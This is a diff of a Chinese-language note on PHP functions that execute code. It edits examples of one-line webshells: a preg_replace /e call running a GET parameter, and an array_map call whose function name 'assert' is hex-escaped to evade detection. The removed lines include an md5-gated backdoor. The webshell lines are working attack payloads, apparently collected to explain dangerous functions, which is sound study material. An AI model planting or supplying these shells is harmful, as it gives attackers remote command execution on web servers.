@@ -88,7 +88,7 @@ preg_replace("/<php>(.*?)$regexp", '\\1', $var);
 ```php
 #当replacement 参数构成一个合理的php 代码字符串的时候
 #/e 修正符使preg_replace()，将replacement 参数当做php 代码执行
-例:一句话木马
+#例:一句话木马
 1.
 <?php
 preg_replace("//e", $_GET['cmd'], "cmd test");
@@ -105,7 +105,9 @@ h=[php]phpinfo()[/php]
 
 ### array_map
 
-```
-<?md5($_GET['qid'])=='850abe17d6d33516c10c6269d899fd19'?array_map("asx73ert",(array)$_REQUEST['page']):next;?>
+```php
+#例:一句话木马
+<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
+1.shell.php?test=phpinfo()
 ```
 
